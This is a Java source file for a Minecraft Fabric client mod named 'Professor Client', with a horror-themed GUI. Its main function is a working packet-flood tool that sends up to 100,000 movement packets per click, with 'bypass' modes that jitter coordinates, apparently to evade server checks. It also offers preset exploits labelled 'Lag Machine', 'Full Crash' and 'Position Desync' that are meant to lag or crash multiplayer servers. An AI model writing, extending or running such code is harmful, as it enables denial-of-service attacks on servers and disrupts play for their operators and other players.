package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ─── SIZE ─────────────────────────────────────────────────────────────────
    private static final int PW = 500, PH = 340;

    // ─── HORROR PALETTE ───────────────────────────────────────────────────────
    private static final int BG_FULL    = 0xFF000000;
    private static final int PANEL_BG   = 0xF0080003;
    private static final int BLOOD_RED  = 0xFFAA0000;
    private static final int BRIGHT_RED = 0xFFFF1111;
    private static final int DARK_RED   = 0xFF330000;
    private static final int DIM_RED    = 0xFF550000;
    private static final int ORANGE_EMB = 0xFFFF4400;

    // ─── TABS ─────────────────────────────────────────────────────────────────
    private static final String[] TABS   = {"  FLOOD  ", "  EXPLOITS  ", "  CONFIG  "};
    private static final String[] BYPASS = {"OFF", "BURST", "MIXED", "CHAOS"};

    // ─── STATE ────────────────────────────────────────────────────────────────
    private final Random rng = new Random();
    private long  tick = 0;
    private int   tab  = 0, bypassMode = 0;
    private float flickerAlpha = 1f;
    private float scanY = 0;

    private String statusText  = "";
    private int    statusColor = BRIGHT_RED, statusTimer = 0;

    private TextFieldWidget pktField;

    // ── Blood drip columns ────────────────────────────────────────────────────
    private static final int DRIP_COLS = 60;
    private final float[] dripY   = new float[DRIP_COLS];
    private final float[] dripSpd = new float[DRIP_COLS];
    private final int[]   dripLen = new int[DRIP_COLS];

    // ── Fire particles ────────────────────────────────────────────────────────
    private final List<float[]> flames = new ArrayList<>();   // x,y,vx,vy,life,maxLife

    // ── Demon skulls ──────────────────────────────────────────────────────────
    private final List<float[]> skulls = new ArrayList<>();   // x,y,alpha,speed

    // ── Corner crack decoration ───────────────────────────────────────────────
    private float crackPulse = 0f;

    // ─── CONSTRUCTOR ─────────────────────────────────────────────────────────
    public ProfessorScreen() {
        super(Text.literal("☠ PROFESSOR CLIENT ☠"));
        initDrips();
        initFlames();
        initSkulls();
    }

    private void initDrips() {
        for (int i = 0; i < DRIP_COLS; i++) {
            dripY[i]   = rng.nextFloat() * -300;
            dripSpd[i] = rng.nextFloat() * 1.4f + 0.4f;
            dripLen[i] = rng.nextInt(22) + 8;
        }
    }

    private void initFlames() {
        flames.clear();
        for (int i = 0; i < 80; i++) spawnFlame();
    }

    private void spawnFlame() {
        float x  = rng.nextFloat() * 2000;
        float y  = 1100 + rng.nextFloat() * 50;
        float vx = (rng.nextFloat() - 0.5f) * 1.2f;
        float vy = -(rng.nextFloat() * 3f + 1.5f);
        int   ml = rng.nextInt(60) + 30;
        flames.add(new float[]{x, y, vx, vy, ml, ml});
    }

    private void initSkulls() {
        skulls.clear();
        for (int i = 0; i < 6; i++) {
            skulls.add(new float[]{
                rng.nextFloat() * 1920,
                rng.nextFloat() * -500 - 50,
                0f,
                rng.nextFloat() * 0.6f + 0.3f
            });
        }
    }

    // ─── INIT ────────────────────────────────────────────────────────────────
    @Override protected void init() { initFlames(); rebuild(); }

    private void rebuild() {
        clearChildren();
        int cx = width / 2, cy = height / 2;
        int px = cx - PW / 2, py = cy - PH / 2;

        // Tab buttons
        int tw = PW / TABS.length;
        for (int i = 0; i < TABS.length; i++) {
            final int idx = i;
            addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),
                    b -> { tab = idx; rebuild(); })
                .dimensions(px + i * tw, py + 32, tw, 20).build());
        }

        // Content
        if      (tab == 0) buildFlood(cx, py);
        else if (tab == 1) buildExploits(cx, py);
        else               buildConfig(cx, py);

        // Close
        addDrawableChild(ButtonWidget.builder(Text.literal("☠  EXIT"),
                b -> close())
            .dimensions(cx - 35, py + PH - 24, 70, 18).build());
    }

    // ── FLOOD TAB ─────────────────────────────────────────────────────────────
    private void buildFlood(int cx, int py) {
        int fy = py + 80;
        pktField = new TextFieldWidget(textRenderer, cx - 48, fy, 96, 16, Text.empty());
        pktField.setMaxLength(6);
        pktField.setText("10000");
        addSelectableChild(pktField);

        int[][] presets = {{100, -120},{1000, -40},{10000, 40},{100000, 120}};
        for (int[] p : presets) {
            int cnt = p[0], ox = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(cnt >= 1000 ? (cnt/1000)+"K" : ""+cnt),
                b -> pktField.setText(""+cnt))
                .dimensions(cx + ox - 18, fy + 22, 36, 14).build());
        }

        addDrawableChild(ButtonWidget.builder(
            Text.literal("⚡ Bypass: " + BYPASS[bypassMode]),
            b -> { bypassMode = (bypassMode+1)%BYPASS.length;
                   b.setMessage(Text.literal("⚡ Bypass: "+BYPASS[bypassMode])); })
            .dimensions(cx - 55, fy + 42, 110, 16).build());

        addDrawableChild(ButtonWidget.builder(
            Text.literal("▶ SEND PACKETS"),
            b -> doSend())
            .dimensions(cx - 75, fy + 64, 150, 20).build());
    }

    // ── EXPLOITS TAB ──────────────────────────────────────────────────────────
    private void buildExploits(int cx, int py) {
        int bw = 290, bx = cx - bw/2, sy = py + 68;
        String[][] btns = {
            {"☠  Swing Flood  — 8K pkts",      "swing"},
            {"☠  Position Desync  — 3K pkts",  "desync"},
            {"☠  Lag Machine  — 50K pkts",      "lag"},
            {"☠  Full Crash  — 200K pkts",      "crash"},
            {"☠  Y-Axis Glitch  — 10K pkts",   "yglitch"}
        };
        for (int i = 0; i < btns.length; i++) {
            final String id = btns[i][1];
            addDrawableChild(ButtonWidget.builder(Text.literal(btns[i][0]),
                    b -> runExploit(id))
                .dimensions(bx, sy + i * 24, bw, 20).build());
        }
    }

    // ── CONFIG TAB ────────────────────────────────────────────────────────────
    private void buildConfig(int cx, int py) {
        int bx = cx - 120, sy = py + 72;
        addDrawableChild(ButtonWidget.builder(Text.literal("Keybind:  M"), b -> {})
            .dimensions(bx, sy,      240, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Clear Status"),
            b -> { statusText=""; statusTimer=0; })
            .dimensions(bx, sy+24, 240, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Professor Client  v2.0"), b -> {})
            .dimensions(bx, sy+48, 240, 18).build());
    }

    // ─── PACKET ACTIONS ──────────────────────────────────────────────────────
    private void doSend() {
        if (notConn()) return;
        int n;
        try { n = Integer.parseInt(pktField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number!", BRIGHT_RED); return; }
        if (n < 1 || n > 100_000) { setStatus("Range: 1 - 100,000", ORANGE_EMB); return; }

        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        boolean g=client.player.isOnGround();

        switch (bypassMode) {
            case 0 -> { for (int i=0;i<n;i++) send(x,y,z,yw,pt,g); }
            case 1 -> { for (int i=0;i<n;i++) send(x,i%2==0?y:y+0.001,z,yw,pt,g); }
            case 2 -> { for (int i=0;i<n;i++) { send(x,y+(i%3)*0.0005,z,yw+(i%2),pt,g); send(x,y,z,yw,pt,g); } }
            case 3 -> { for (int i=0;i<n;i++) { send(x,y+(i%8)*0.0001,z,yw+(i%6),pt,false); send(x,y,z,yw,pt,g); } }
        }
        setStatus("☠ Sent "+n+" pkts | Bypass: "+BYPASS[bypassMode], BRIGHT_RED);
    }

    private void runExploit(String id) {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        boolean g=client.player.isOnGround();
        switch (id) {
            case "swing"  -> { for(int i=0;i<8000;i++) send(x,y+(i%4)*0.0001,z,yw+(i%3),pt,true); setStatus("☠ Swing Flood — 8K pkts!",BRIGHT_RED); }
            case "desync" -> { for(int i=0;i<3000;i++) send(x,i%2==0?y+200:y,z,yw,pt,false); setStatus("☠ Desync — 3K pkts!",BRIGHT_RED); }
            case "lag"    -> { for(int i=0;i<50000;i++){send(x,y+i*0.00001,z,yw,pt,g);if(i%3==0)send(x,y,z,yw+(i%8),pt,g);} setStatus("☠ Lag Machine — 67K pkts!",ORANGE_EMB); }
            case "crash"  -> { for(int i=0;i<100000;i++){send(x,y+(i%500)*0.0001,z,yw+(i%4),pt,false);send(x,y,z,yw,pt,false);} setStatus("☠ CRASH — 200K pkts!",BRIGHT_RED); }
            case "yglitch"-> { for(int i=0;i<10000;i++){double dy=switch(i%4){case 0->y+256;case 1->y-64;case 2->y+0.42;default->y;};send(x,dy,z,yw,pt,i%2==0);} setStatus("☠ Y-Glitch — 10K!",BRIGHT_RED); }
        }
    }

    private void send(double x,double y,double z,float yw,float pt,boolean g) {
        if(client!=null&&client.player!=null&&client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }

    private boolean notConn() {
        if(client==null||client.player==null){setStatus("Not connected!",BLOOD_RED);return true;}
        return false;
    }

    private void setStatus(String m,int c){statusText=m;statusColor=c;statusTimer=200;}

    // ─── RENDER ──────────────────────────────────────────────────────────────
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W=width, H=height, cx=W/2, cy=H/2;
        int px=cx-PW/2, py=cy-PH/2;

        // ── Full black bg ──────────────────────────────────────────────────
        ctx.fill(0,0,W,H,BG_FULL);

        // ── Blood drip bg ─────────────────────────────────────────────────
        drawBloodDrips(ctx,W,H);

        // ── Fire at bottom ────────────────────────────────────────────────
        drawFire(ctx,W,H);

        // ── Skulls falling ────────────────────────────────────────────────
        drawSkulls(ctx,W,H);

        // ── Flicker ───────────────────────────────────────────────────────
        if (rng.nextInt(40)==0) flickerAlpha = 0.55f + rng.nextFloat()*0.3f;
        else flickerAlpha = Math.min(1f, flickerAlpha + 0.06f);

        // ── Panel bg ──────────────────────────────────────────────────────
        ctx.fill(px, py, px+PW, py+PH, PANEL_BG);

        // ── Animated blood border ─────────────────────────────────────────
        float t = (float)(tick*0.06);
        int pulse = (int)(180 + 75*Math.sin(t));
        int bc = 0xFF000000 | (pulse<<16);           // pulsing red
        int bd = 0x66000000 | (pulse<<16);

        ctx.fill(px,    py,    px+PW, py+3,    bc);
        ctx.fill(px,    py+PH-3, px+PW, py+PH, bc);
        ctx.fill(px,    py,    px+3,  py+PH,  bc);
        ctx.fill(px+PW-3, py, px+PW, py+PH,  bc);
        ctx.fill(px+3, py+3, px+PW-3, py+5,  bd);
        ctx.fill(px+3, py+PH-5, px+PW-3, py+PH-3, bd);

        // ── Blood scan line ───────────────────────────────────────────────
        scanY = (scanY+1.2f) % PH;
        ctx.fill(px, py+(int)scanY, px+PW, py+(int)scanY+2, 0x22FF0000);

        // ── Header bg ─────────────────────────────────────────────────────
        ctx.fill(px, py, px+PW, py+30, 0xCC150000);
        ctx.fill(px, py+29, px+PW, py+31, bc);

        // ── Title ─────────────────────────────────────────────────────────
        drawTitle(ctx, cx, py, pulse);

        // ── Separator below tabs ──────────────────────────────────────────
        ctx.fill(px+3, py+53, px+PW-3, py+55, 0x88440000);

        // ── Widgets ───────────────────────────────────────────────────────
        if (pktField!=null) pktField.render(ctx,mx,my,delta);
        super.render(ctx,mx,my,delta);

        // ── Tab info labels ───────────────────────────────────────────────
        drawTabLabels(ctx, px, py, cx, bc);

        // ── Status bar ────────────────────────────────────────────────────
        if (statusTimer>0 && !statusText.isEmpty()) {
            int a=Math.min(255,statusTimer*2);
            int col=(statusColor&0x00FFFFFF)|(a<<24);
            ctx.fill(px+4, py+PH-20, px+PW-4, py+PH-4, 0xAA110000);
            int sw=textRenderer.getWidth(statusText);
            ctx.drawText(textRenderer, statusText, cx-sw/2, py+PH-15, col, false);
        }
        if (statusTimer>0) statusTimer--;

        // ── Blood corner brackets ─────────────────────────────────────────
        drawCorners(ctx, px, py, bc);

        // ── Dripping blood top edge ───────────────────────────────────────
        drawTopBloodDrips(ctx, px, py, bc);
    }

    // ─── TITLE ───────────────────────────────────────────────────────────────
    private void drawTitle(DrawContext ctx, int cx, int py, int pulse) {
        // Flicker effect
        if (rng.nextInt(12)==0) pulse = (int)(pulse * 0.3f);

        int col = 0xFF000000 | (pulse<<16);
        String t1 = "\u2620 PROFESSOR CLIENT \u2620";
        int tw = textRenderer.getWidth(t1);

        // Shadow
        ctx.drawText(textRenderer, t1, cx-tw/2-1, py+8,  0xFF000000, false);
        ctx.drawText(textRenderer, t1, cx-tw/2+1, py+8,  0xFF000000, false);
        ctx.drawText(textRenderer, t1, cx-tw/2,   py+9,  0xFF000000, false);
        // Main
        ctx.drawText(textRenderer, t1, cx-tw/2,   py+8,  col, false);

        // Sub
        String sub = "v2.0  \u2022  Fabric 1.21.1  \u2022  DARKNESS MODE";
        ctx.drawText(textRenderer, sub,
            cx - textRenderer.getWidth(sub)/2, py+20, 0xFF550000, false);
    }

    // ─── TAB LABELS ──────────────────────────────────────────────────────────
    private void drawTabLabels(DrawContext ctx, int px, int py, int cx, int bc) {
        if (tab==0) {
            ctx.drawText(textRenderer,"Packet Count:",
                cx-48-textRenderer.getWidth("Packet Count:")-4, py+82, DIM_RED, false);
        }
        if (tab==1) {
            ctx.drawText(textRenderer,"\u2620  Choose your weapon:",
                cx-textRenderer.getWidth("\u2620  Choose your weapon:")/2, py+57, BLOOD_RED, false);
        }
        if (tab==2) {
            ctx.drawText(textRenderer,"\u2620  Settings",
                cx-textRenderer.getWidth("\u2620  Settings")/2, py+57, BLOOD_RED, false);
        }
    }

    // ─── BLOOD DRIPS (background) ─────────────────────────────────────────────
    private void drawBloodDrips(DrawContext ctx, int W, int H) {
        int cw = Math.max(5, W/DRIP_COLS);
        for (int i=0; i<DRIP_COLS; i++) {
            dripY[i] += dripSpd[i];
            if (dripY[i] > H+40) {
                dripY[i] = -(dripLen[i]*7 + rng.nextInt(50));
                dripSpd[i] = rng.nextFloat()*1.4f+0.4f;
            }
            int x = i*cw;
            for (int j=0; j<dripLen[i]; j++) {
                int y = (int)dripY[i] - j*7;
                if (y<0||y>H) continue;
                float br = 1f-(float)j/dripLen[i];
                int r = j==0 ? 180 : (int)(br*140+20);
                int a = j==0 ? (int)(br*160) : (int)(br*60);
                ctx.fill(x, y, x+cw-2, y+6, (a<<24)|(r<<16));
            }
        }
    }

    // ─── TOP BLOOD DRIPS (panel edge) ─────────────────────────────────────────
    private void drawTopBloodDrips(DrawContext ctx, int px, int py, int bc) {
        for (int i=0; i<8; i++) {
            int x = px + 20 + i * (PW/8);
            int dropLen = 4 + (int)(5 * Math.abs(Math.sin(tick*0.05+i)));
            for (int j=0; j<dropLen; j++) {
                int a = 200 - j*20; if (a<=0) continue;
                int w = Math.max(1, 3-j/2);
                ctx.fill(x-w/2, py+3+j, x+w/2+1, py+4+j, (a<<24)|0xAA0000);
            }
        }
    }

    // ─── FIRE PARTICLES ──────────────────────────────────────────────────────
    private void drawFire(DrawContext ctx, int W, int H) {
        List<float[]> dead = new ArrayList<>();
        for (float[] f : flames) {
            f[0] += f[2]; f[1] += f[3];
            f[4] -= 1f;
            if (f[4] <= 0 || f[1] < 0) { dead.add(f); continue; }

            float life = f[4]/f[5];
            int fx=(int)(f[0]/1920f*W), fy=(int)(f[1]/1100f*H);
            if (fx<0||fx>W||fy<0||fy>H) { dead.add(f); continue; }

            int r=(int)(255*Math.min(1f,life*2));
            int g=(int)(Math.max(0f,(life-0.5f)*2)*200);
            int a=(int)(life*180);
            int sz=Math.max(1,(int)(life*4));
            ctx.fill(fx,fy,fx+sz,fy+sz,(a<<24)|(r<<16)|(g<<8));
        }
        flames.removeAll(dead);
        while (flames.size()<80) spawnFlame();
    }

    // ─── SKULLS ──────────────────────────────────────────────────────────────
    private void drawSkulls(DrawContext ctx, int W, int H) {
        for (float[] s : skulls) {
            s[1] += s[3];
            if (s[1] > H+30) {
                s[0] = rng.nextFloat()*W;
                s[1] = -30;
                s[2] = 0.4f + rng.nextFloat()*0.4f;
                s[3] = rng.nextFloat()*0.6f+0.3f;
            }
            int sx=(int)s[0], sy=(int)s[1];
            int a=Math.max(0,Math.min(255,(int)(s[2]*120)));

            // Draw a simple skull glyph
            ctx.drawText(textRenderer, "\u2620",
                sx-textRenderer.getWidth("\u2620")/2, sy, (a<<24)|0xAA0000, false);
        }
    }

    // ─── CORNER BRACKETS ─────────────────────────────────────────────────────
    private void drawCorners(DrawContext ctx, int px, int py, int c) {
        int s=14;
        // top-left
        ctx.fill(px,py,px+s,py+3,c); ctx.fill(px,py,px+3,py+s,c);
        // top-right
        ctx.fill(px+PW-s,py,px+PW,py+3,c); ctx.fill(px+PW-3,py,px+PW,py+s,c);
        // bottom-left
        ctx.fill(px,py+PH-3,px+s,py+PH,c); ctx.fill(px,py+PH-s,px+3,py+PH,c);
        // bottom-right
        ctx.fill(px+PW-s,py+PH-3,px+PW,py+PH,c); ctx.fill(px+PW-3,py+PH-s,px+PW,py+PH,c);

        // inner cracks (static decorative lines)
        int dim = 0x44AA0000;
        ctx.fill(px+3,py+3,px+8,py+4,dim); ctx.fill(px+3,py+3,px+4,py+9,dim);
        ctx.fill(px+PW-8,py+3,px+PW-3,py+4,dim); ctx.fill(px+PW-4,py+3,px+PW-3,py+9,dim);
    }

    // ─── INPUT ───────────────────────────────────────────────────────────────
    @Override public boolean keyPressed(int kc,int sc,int m) {
        if (pktField!=null&&pktField.isFocused()&&pktField.keyPressed(kc,sc,m)) return true;
        return super.keyPressed(kc,sc,m);
    }
    @Override public boolean charTyped(char c,int m) {
        if (pktField!=null&&pktField.isFocused()) return pktField.charTyped(c,m);
        return super.charTyped(c,m);
    }
    @Override public boolean mouseClicked(double mx,double my,int b) {
        if (pktField!=null) pktField.mouseClicked(mx,my,b);
        return super.mouseClicked(mx,my,b);
    }
    @Override public boolean shouldPause()      { return false; }
    @Override public boolean shouldCloseOnEsc() { return true;  }
    @Override public void    tick()              { super.tick(); }
}
